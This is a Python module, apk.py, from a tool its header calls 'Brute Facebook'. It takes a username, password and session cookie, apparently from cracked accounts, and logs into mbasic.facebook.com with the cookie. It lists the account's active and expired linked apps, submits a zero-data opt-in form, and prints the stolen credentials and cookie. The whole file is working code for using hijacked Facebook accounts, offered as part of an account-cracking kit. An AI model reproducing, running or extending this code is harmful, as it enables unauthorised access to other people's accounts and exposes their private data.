#######################################################
# Name           : Brute Facebook (BF)                #
# File           : apk.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re

from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.tree import Tree

class Cek_Apk:

    def __init__(self, user, pw, cok, dik):
        self.ak, self.ka = [], []
        self.cok = {"cookie": cok}
        self.ses = requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.cek_apk(user, pw, cok, dik)

    def cek_apk(self, user, pw, coki, digi):
        aktif = Tree("")
        self.ApkAktif(f"{self.url}/settings/apps/tabbed/?tab=active")
        if len(self.ak)==0:
            aktif.add("[italic bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ak:
                aktif.add(apk)
        kadal = Tree("")
        self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive")
        if len(self.ka)==0:
            kadal.add("[italic bold red]Tidak ada apklikasi Kedaluwarsa yang terkait di akun ini")
        else:
            for apk in self.ka:
                kadal.add(apk)
        tree = Tree("")
        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digi}[/]")
        tree.add("Aplikasi Terkait").add(f"Aktif [bold green]{str(len(self.ak))}[/]").add(aktif)
        tree.add("").add(f"Kedaluwarsa [bold red]{str(len(self.ka))}[/]").add(kadal)
        prints(tree)

    def ApkAktif(self, url):
        try:
            link = par(self.ses.get(url, cookies=self.cok).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll)
            for apk in link.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    self.ak.append(f"[bold green]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}")
                else:continue
            self.ApkAktif(self.url+link.find("a", string="Lihat Lainnya")["href"])
        except:pass

    def ApkKadal(self, url):
        try:
            link = par(self.ses.get(url, cookies=self.cok).text, "html.parser")
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ubah_data(urll)
            for apk in link.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    self.ka.append(f"[bold red]{str(apk.text).replace('Kedaluwarsa','[bold white] - Kedaluwarsa')}")
                else:continue
            self.ApkKadal(self.url+link.find("a", string="Lihat Lainnya")["href"])
        except:pass

    def ubah_data(self, link):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies=self.cok).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies=self.cok).text
        except:pass